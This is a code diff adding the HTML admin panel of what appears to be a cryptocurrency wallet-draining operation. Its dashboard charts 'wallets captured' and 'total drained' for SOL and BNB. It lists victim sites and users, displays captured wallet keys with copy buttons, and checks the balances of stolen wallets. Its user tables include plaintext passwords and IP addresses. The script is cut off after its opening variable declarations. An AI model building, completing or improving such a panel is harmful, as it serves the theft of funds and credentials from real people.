@@ -1,0 +1,2253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0b0d;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+        }
+
+        .sidebar {
+            width: 220px;
+            background: #0a0b0d;
+            border-right: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            flex-direction: column;
+            position: fixed;
+            height: 100vh;
+            z-index: 100;
+        }
+
+        .sidebar-header { padding: 20px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); }
+        .sidebar-header .logo { font-size: 18px; font-weight: 800; }
+
+        .nav-section { padding: 16px 12px; }
+        .nav-section:last-of-type { margin-top: auto; }
+        .nav-section-title { font-size: 10px; color: rgba(255, 255, 255, 0.4); text-transform: uppercase; letter-spacing: 1px; padding: 0 8px; margin-bottom: 8px; }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 12px;
+            color: rgba(255, 255, 255, 0.6);
+            text-decoration: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .nav-item:hover { background: rgba(255, 255, 255, 0.05); color: #ffffff; }
+        .nav-item.active { background: rgba(255, 255, 255, 0.1); color: #ffffff; border: 1px solid rgba(255, 255, 255, 0.1); }
+        .nav-item svg { width: 18px; height: 18px; fill: currentColor; flex-shrink: 0; }
+
+        .main-content { flex: 1; margin-left: 220px; min-height: 100vh; }
+
+        .header {
+            padding: 20px 32px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-left h1 { font-size: 20px; font-weight: 600; margin-bottom: 4px; }
+        .header-left p { font-size: 12px; color: rgba(255, 255, 255, 0.5); }
+        .header-right { display: flex; align-items: center; gap: 12px; }
+
+        .logout-btn {
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .logout-btn:hover { background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.3); color: #ef4444; }
+
+        .content { padding: 24px 32px; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 20px;
+            transition: all 0.2s ease;
+        }
+
+        .stat-card:hover { border-color: rgba(255, 255, 255, 0.15); }
+        .stat-card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+        .stat-card-title { font-size: 11px; color: rgba(255, 255, 255, 0.5); text-transform: uppercase; letter-spacing: 0.5px; }
+        .stat-card-icon { width: 20px; height: 20px; fill: rgba(255, 255, 255, 0.3); }
+        .stat-card-value { font-size: 28px; font-weight: 700; }
+
+        .charts-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; margin-bottom: 24px; }
+
+        .chart-card {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 20px;
+            transition: all 0.2s ease;
+        }
+
+        .chart-card:hover { border-color: rgba(255, 255, 255, 0.15); }
+        .chart-card.full-width { grid-column: span 2; }
+        .chart-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; gap: 16px; flex-wrap: wrap; }
+        .chart-title { font-size: 11px; color: rgba(255, 255, 255, 0.5); text-transform: uppercase; letter-spacing: 0.5px; }
+        .chart-header-controls { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+
+        .chart-legend-bar { display: flex; gap: 8px; align-items: center; }
+
+        .chart-legend-btn {
+            padding: 7px 14px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 6px;
+            color: rgba(255, 255, 255, 0.65);
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .chart-legend-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.22);
+            color: #ffffff;
+        }
+
+        .chart-legend-btn.active {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(255, 255, 255, 0.25);
+            color: #ffffff;
+        }
+
+        .chart-legend-btn.inactive {
+            opacity: 0.4;
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        .chart-legend-btn.inactive:hover {
+            opacity: 0.65;
+        }
+
+        .chart-canvas-wrapper { position: relative; width: 100%; height: 200px; }
+
+        .table-container {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            overflow: hidden;
+            margin-top: 24px;
+        }
+
+        .table-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .table-title { font-size: 14px; font-weight: 600; color: #ffffff; }
+        .table-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+
+        .data-table { width: 100%; border-collapse: collapse; }
+        .data-table th {
+            padding: 12px 16px;
+            text-align: left;
+            font-size: 11px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .data-table td { padding: 12px 16px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); color: rgba(255, 255, 255, 0.8); font-size: 13px; }
+        .data-table tr:hover { background: rgba(255, 255, 255, 0.03); }
+
+        .btn {
+            padding: 8px 14px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            position: relative;
+            overflow: visible;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .btn:hover { background: rgba(255, 255, 255, 0.1); color: #ffffff; transform: translateY(-1px); }
+        .btn svg { width: 16px; height: 16px; fill: rgba(255, 255, 255, 0.6); transition: fill 0.2s ease; flex-shrink: 0; }
+        .btn svg path { fill: inherit; }
+        .btn:hover svg { fill: #ffffff; }
+
+        .btn-primary svg { fill: rgba(255, 255, 255, 0.6); }
+        .btn-primary { background: rgba(255, 255, 255, 0.05); border-color: rgba(255, 255, 255, 0.1); }
+        .btn-primary:hover { background: rgba(255, 255, 255, 0.1); border-color: rgba(255, 255, 255, 0.2); }
+
+        .btn-danger { background: rgba(255, 255, 255, 0.05); border-color: rgba(255, 255, 255, 0.1); }
+        .btn-danger:hover { background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.3); color: #ef4444; }
+        .btn-danger:hover svg { fill: #ef4444; }
+        .btn-danger svg { fill: rgba(255, 255, 255, 0.6); }
+
+        .btn-success { background: rgba(255, 255, 255, 0.05); border-color: rgba(255, 255, 255, 0.1); }
+        .btn-success:hover { background: rgba(16, 185, 129, 0.1); border-color: rgba(16, 185, 129, 0.3); color: #10b981; }
+        .btn-success:hover svg { fill: #10b981; }
+        .btn-success svg { fill: rgba(255, 255, 255, 0.6); }
+
+        .btn-secondary { background: rgba(255, 255, 255, 0.05); border-color: rgba(255, 255, 255, 0.1); }
+
+        .btn-with-text {
+            width: auto;
+            padding: 8px 14px;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            font-family: 'Inter', sans-serif;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .btn-with-text:hover { color: #ffffff; }
+        .btn-with-text svg { width: 14px; height: 14px; flex-shrink: 0; }
+
+        .tooltip {
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #111214;
+            color: #ffffff;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            white-space: nowrap;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s ease, visibility 0.2s ease;
+            z-index: 1000;
+            margin-bottom: 5px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .tooltip::after {
+            content: '';
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-top: 5px solid #111214;
+        }
+
+        .btn:hover .tooltip { opacity: 1; visibility: visible; }
+
+        .status-indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 8px; }
+        .status-success { background: #10b981; }
+        .status-warning { background: #f59e0b; }
+        .status-error { background: #ef4444; }
+
+        .modal {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: #111214;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 0;
+            max-width: 90vw;
+            width: 800px;
+            max-height: 80vh;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            background: #111214;
+        }
+
+        .modal-title { font-size: 16px; font-weight: 600; color: #ffffff; margin: 0; }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 24px;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+        }
+
+        .modal-close:hover { background: rgba(255, 255, 255, 0.1); color: #ffffff; }
+
+        .modal-body { padding: 20px; overflow-y: auto; max-height: calc(80vh - 60px); }
+
+        .wallet-item {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+            transition: all 0.2s ease;
+        }
+
+        .wallet-item:hover { border-color: rgba(255, 255, 255, 0.15); }
+        .wallet-item:last-child { margin-bottom: 0; }
+        .wallet-success { border-color: rgba(255, 255, 255, 0.08); }
+        .wallet-error { border-color: rgba(239, 68, 68, 0.3); background: rgba(239, 68, 68, 0.05); }
+
+        .key-section { margin-bottom: 12px; }
+        .key-section:last-child { margin-bottom: 0; }
+        .key-label { font-size: 11px; font-weight: 500; color: rgba(255, 255, 255, 0.4); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        .key-display {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 4px;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            word-break: break-all;
+            color: rgba(255, 255, 255, 0.7);
+            position: relative;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            line-height: 1.4;
+        }
+
+        .key-display:hover { border-color: rgba(255, 255, 255, 0.2); }
+        .key-display.blurred { filter: blur(4px); user-select: none; }
+        .key-display-with-copy { position: relative; }
+
+        .copy-btn {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: rgba(255, 255, 255, 0.5);
+            padding: 4px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            opacity: 0;
+        }
+
+        .key-display:hover .copy-btn { opacity: 1; }
+        .copy-btn:hover { background: rgba(255, 255, 255, 0.2); color: #ffffff; }
+        .copy-btn svg { width: 12px; height: 12px; fill: currentColor; }
+
+        .wallet-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .wallet-number { font-size: 14px; font-weight: 600; color: #ffffff; }
+        .wallet-status-icon { width: 16px; height: 16px; }
+
+        .copy-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ffffff;
+            color: #1a1a1a;
+            padding: 12px 20px;
+            border-radius: 6px;
+            z-index: 1001;
+            display: none;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            font-weight: 500;
+        }
+
+        .error-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ef4444;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 6px;
+            z-index: 1001;
+            display: none;
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
+        }
+
+        .settings-section {
+            margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .settings-section:last-child { border-bottom: none; margin-bottom: 0; }
+
+        .settings-title {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .save-btn {
+            background: #ffffff;
+            color: #0a0b0d;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s ease;
+            margin-top: 20px;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .save-btn:hover { background: rgba(255, 255, 255, 0.9); transform: translateY(-1px); }
+
+        .settings-input-group { margin-bottom: 16px; }
+
+        .settings-input-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.5);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .settings-input {
+            width: 100%;
+            padding: 12px 14px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            transition: all 0.2s ease;
+        }
+
+        .settings-input:focus { outline: none; border-color: rgba(255, 255, 255, 0.3); }
+        .settings-input::placeholder { color: rgba(255, 255, 255, 0.3); }
+        .settings-input-small { width: 120px; }
+
+        .settings-input option { background: #111214; color: #ffffff; padding: 12px; }
+
+        .settings-row { display: flex; gap: 16px; flex-wrap: wrap; }
+        .settings-row .settings-input-group { flex: 1; min-width: 150px; }
+
+        .settings-toggle {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 6px;
+            margin-bottom: 12px;
+        }
+
+        .settings-toggle-label { font-size: 14px; color: rgba(255, 255, 255, 0.7); }
+
+        .toggle-switch {
+            position: relative;
+            width: 48px;
+            height: 24px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .toggle-switch.active { background: #10b981; }
+
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 20px;
+            height: 20px;
+            background: #ffffff;
+            border-radius: 50%;
+            transition: all 0.3s ease;
+        }
+
+        .toggle-switch.active::after { left: 26px; }
+
+        .settings-subsection { margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255, 255, 255, 0.08); }
+        .settings-subsection-title { font-size: 14px; font-weight: 600; color: #ffffff; margin-bottom: 12px; }
+
+        .sub-tab-bar { display: flex; gap: 0; margin-bottom: 16px; }
+        .sub-tab-btn {
+            padding: 8px 18px;
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+        }
+        .sub-tab-btn:first-child { border-radius: 6px 0 0 6px; }
+        .sub-tab-btn:last-child { border-radius: 0 6px 6px 0; }
+        .sub-tab-btn.active { color: #fff; background: rgba(255, 255, 255, 0.1); border-color: rgba(255, 255, 255, 0.15); }
+        .sub-tab-btn:hover { color: rgba(255, 255, 255, 0.8); }
+
+        .user-field {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: background 0.15s ease;
+            display: inline-block;
+            max-width: 220px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .user-field:hover { background: rgba(255, 255, 255, 0.08); color: #fff; }
+        .user-field-full {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: background 0.15s ease;
+            display: inline-block;
+        }
+        .user-field-full:hover { background: rgba(255, 255, 255, 0.08); color: #fff; }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            position: fixed;
+            top: 16px;
+            left: 16px;
+            z-index: 101;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 8px;
+            padding: 10px;
+            cursor: pointer;
+        }
+        .mobile-menu-btn svg { width: 24px; height: 24px; fill: white; }
+
+        @media (max-width: 1024px) {
+            .stats-grid { grid-template-columns: repeat(3, 1fr); }
+            .charts-grid { grid-template-columns: 1fr 1fr; }
+        }
+
+        @media (max-width: 768px) {
+            .mobile-menu-btn { display: block; }
+            .sidebar { transform: translateX(-100%); transition: transform 0.3s ease; }
+            .sidebar.open { transform: translateX(0); }
+            .main-content { margin-left: 0; }
+            .header { padding: 16px 20px 16px 60px; flex-wrap: wrap; gap: 12px; }
+            .header-left h1 { font-size: 16px; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 12px; }
+            .stat-card { padding: 16px; }
+            .stat-card-value { font-size: 24px; }
+            .charts-grid { grid-template-columns: 1fr; }
+            .chart-card.full-width { grid-column: span 1; }
+            .content { padding: 16px; }
+            .table-header { flex-direction: column; gap: 12px; align-items: flex-start; }
+            .data-table th, .data-table td { padding: 10px 12px; }
+        }
+
+        @media (max-width: 480px) {
+            .stats-grid { grid-template-columns: 1fr; }
+            .stat-card-value { font-size: 20px; }
+            .header { padding: 12px 16px 12px 56px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="copy-notification" id="copyNotification">Copied to clipboard!</div>
+    <div class="error-notification" id="errorNotification">Error occurred!</div>
+
+    <button class="mobile-menu-btn" onclick="toggleSidebar()">
+        <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" fill="currentColor"/></svg>
+    </button>
+
+    <nav class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <div class="logo">zzz</div>
+        </div>
+
+        <div class="nav-section">
+            <div class="nav-section-title">MAIN</div>
+            <div class="nav-item active" onclick="switchTab('data')" data-tab="data">
+                Dashboard
+            </div>
+            <div class="nav-item" onclick="switchTab('logs')" data-tab="logs">
+                Logs
+            </div>
+            <div class="nav-item" onclick="switchTab('users')" data-tab="users">
+                Users
+            </div>
+        </div>
+
+        <div class="nav-section">
+            <div class="nav-item" onclick="openSettingsModal()">
+                <svg viewBox="0 0 24 24"><path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.34 19.43,11.03L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.5,5.32 14.87,5.07L14.5,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.5,2.42L9.13,5.07C8.5,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.22,8.95 2.27,9.22 2.46,9.37L4.57,11.03C4.53,11.34 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.22,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.94C7.96,18.34 8.5,18.68 9.13,18.93L9.5,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.5,21.58L14.87,18.93C15.5,18.68 16.04,18.34 16.56,17.94L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z" fill="currentColor"/></svg>
+                Settings
+            </div>
+        </div>
+
+    </nav>
+
+    <main class="main-content">
+        <header class="header">
+            <div class="header-left">
+                <h1 id="headerTitle">Dashboard</h1>
+                <p id="currentDate"></p>
+            </div>
+            <div class="header-right">
+                <button class="logout-btn" onclick="logout()">Logout</button>
+            </div>
+        </header>
+
+        <div class="content">
+            <div id="tab-data" class="tab-content active">
+                <div class="stats-grid" id="statsGrid"></div>
+
+                <div class="charts-grid">
+                    <div class="chart-card full-width">
+                        <div class="chart-header">
+                            <span class="chart-title">TOTAL HITS</span>
+                            <div class="sub-tab-bar" style="margin-bottom:0;">
+                                <button class="sub-tab-btn active" onclick="setChartPeriod('hits','daily',this)">Daily</button>
+                                <button class="sub-tab-btn" onclick="setChartPeriod('hits','weekly',this)">Weekly</button>
+                                <button class="sub-tab-btn" onclick="setChartPeriod('hits','monthly',this)">Monthly</button>
+                                <button class="sub-tab-btn" onclick="setChartPeriod('hits','yearly',this)">Yearly</button>
+                                <button class="sub-tab-btn" onclick="setChartPeriod('hits','lifetime',this)">Lifetime</button>
+                            </div>
+                        </div>
+                        <div class="chart-canvas-wrapper">
+                            <canvas id="hitsChart"></canvas>
+                        </div>
+                    </div>
+                    <div class="chart-card full-width">
+                        <div class="chart-header">
+                            <span class="chart-title">WALLETS CAPTURED</span>
+                            <div class="chart-header-controls">
+                                <div class="chart-legend-bar">
+                                    <button type="button" class="chart-legend-btn active" id="walletsSolToggle" onclick="toggleWalletsDataset(0, this)">SOL Wallets</button>
+                                    <button type="button" class="chart-legend-btn active" id="walletsBnbToggle" onclick="toggleWalletsDataset(1, this)">BNB Wallets</button>
+                                </div>
+                                <div class="sub-tab-bar" style="margin-bottom:0;">
+                                    <button class="sub-tab-btn active" onclick="setChartPeriod('wallets','daily',this)">Daily</button>
+                                    <button class="sub-tab-btn" onclick="setChartPeriod('wallets','weekly',this)">Weekly</button>
+                                    <button class="sub-tab-btn" onclick="setChartPeriod('wallets','monthly',this)">Monthly</button>
+                                    <button class="sub-tab-btn" onclick="setChartPeriod('wallets','yearly',this)">Yearly</button>
+                                    <button class="sub-tab-btn" onclick="setChartPeriod('wallets','lifetime',this)">Lifetime</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="chart-canvas-wrapper">
+                            <canvas id="walletsChart"></canvas>
+                        </div>
+                    </div>
+                    <div class="chart-card full-width">
+                        <div class="chart-header">
+                            <span class="chart-title">TOTAL DRAINED</span>
+                            <div class="sub-tab-bar" style="margin-bottom:0;">
+                                <button class="sub-tab-btn active" onclick="setChartPeriod('drained','daily',this)">Daily</button>
+                                <button class="sub-tab-btn" onclick="setChartPeriod('drained','weekly',this)">Weekly</button>
+                                <button class="sub-tab-btn" onclick="setChartPeriod('drained','monthly',this)">Monthly</button>
+                                <button class="sub-tab-btn" onclick="setChartPeriod('drained','yearly',this)">Yearly</button>
+                                <button class="sub-tab-btn" onclick="setChartPeriod('drained','lifetime',this)">Lifetime</button>
+                            </div>
+                        </div>
+                        <div class="chart-canvas-wrapper">
+                            <canvas id="drainedChart"></canvas>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-logs" class="tab-content">
+                <div style="display: flex; justify-content: flex-end; margin-bottom: 16px; gap: 8px;">
+                    <button class="btn btn-with-text btn-primary" onclick="exportLogs()">
+                        Export Logs
+                    </button>
+                    <button class="btn btn-with-text btn-primary" onclick="checkBalances()" id="checkBalanceNavBtn">
+                        Check Balances
+                    </button>
+                </div>
+
+                <div id="balanceResults" style="display: none;" class="table-container">
+                    <div class="table-header">
+                        <div class="table-title" style="display: flex; align-items: center; gap: 10px;">Balance Check Results</div>
+                        <div class="table-actions">
+                            <button class="btn btn-danger" onclick="hideBalanceResults()">
+                                <svg viewBox="0 0 24 24"><path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z" fill="currentColor"/></svg>
+                                <div class="tooltip">Close</div>
+                            </button>
+                        </div>
+                    </div>
+                    <div id="balanceSummary" style="padding: 20px; border-bottom: 1px solid rgba(255, 255, 255, 0.08);"></div>
+                    <div style="overflow-x: auto;">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>Entry ID</th>
+                                    <th>Wallet #</th>
+                                    <th>Chain</th>
+                                    <th>Public Key</th>
+                                    <th>Balance</th>
+                                    <th>USD Value</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="balanceTableBody"></tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="table-container">
+                    <div class="table-header">
+                        <div class="table-title" style="display: flex; align-items: center; gap: 10px;">Data</div>
+                        <div class="table-actions">
+                            <span id="totalEntries" style="color: rgba(255, 255, 255, 0.7);"></span>
+                        </div>
+                    </div>
+                    <div style="overflow-x: auto;">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>Status</th>
+                                    <th>Time</th>
+                                    <th>Site</th>
+                                    <th>User</th>
+                                    <th>Wallets</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="dataTableBody"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-users" class="tab-content">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                    <div class="sub-tab-bar" style="margin-bottom: 0;">
+                        <button class="sub-tab-btn active" onclick="switchUsersSubTab('active')">Active Users</button>
+                        <button class="sub-tab-btn" onclick="switchUsersSubTab('deleted')">Deleted Users</button>
+                    </div>
+                    <button class="btn btn-with-text btn-primary" id="exportUsersBtn" onclick="exportUsers()">
+                        Export Users
+                    </button>
+                </div>
+
+                <div id="subtab-active" class="tab-content active">
+                    <div class="table-container" style="margin-top: 0;">
+                        <div class="table-header">
+                            <div class="table-title">Active Users</div>
+                            <span id="totalUsers" style="color: rgba(255,255,255,0.7);"></span>
+                        </div>
+                        <div style="overflow-x: auto;">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>Username</th>
+                                        <th>Password</th>
+                                        <th>Signup Date</th>
+                                        <th>Last Login</th>
+                                        <th>Signup IP</th>
+                                        <th>Last Auth IP</th>
+                                        <th>User Agent</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="usersTableBody"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="subtab-deleted" class="tab-content">
+                    <div class="table-container" style="margin-top: 0;">
+                        <div class="table-header">
+                            <div class="table-title">Deleted Users</div>
+                            <span id="totalDeletedUsers" style="color: rgba(255,255,255,0.7);"></span>
+                        </div>
+                        <div style="overflow-x: auto;">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>Username</th>
+                                        <th>Password</th>
+                                        <th>Signup Date</th>
+                                        <th>Last Login</th>
+                                        <th>Signup IP</th>
+                                        <th>Last Auth IP</th>
+                                        <th>User Agent</th>
+                                        <th>Deleted At</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="deletedUsersTableBody"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div id="priceTicker" style="position: fixed; bottom: 12px; right: 12px; z-index: 999; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 6px; padding: 6px 10px; display: flex; align-items: center; gap: 10px; font-size: 11px; font-weight: 600; color: rgba(255, 255, 255, 0.7); backdrop-filter: blur(8px);">
+        <span>SOL: <span id="tickerSolPrice" style="color: #ffffff;">$—</span></span>
+        <span style="width: 1px; height: 12px; background: rgba(255, 255, 255, 0.1);"></span>
+        <span>BNB: <span id="tickerBnbPrice" style="color: #ffffff;">$—</span></span>
+    </div>
+
+    <script>
+        let bookmarkData = [];
+        let serverConfig = {};
+        let drainHistory = [];
+        let customDrainedAmount = 0;
+        let hitsChartInstance = null;
+        let walletsChartInstance = null;
+        let drainedChartInstance = null;
+        let usersData = [];
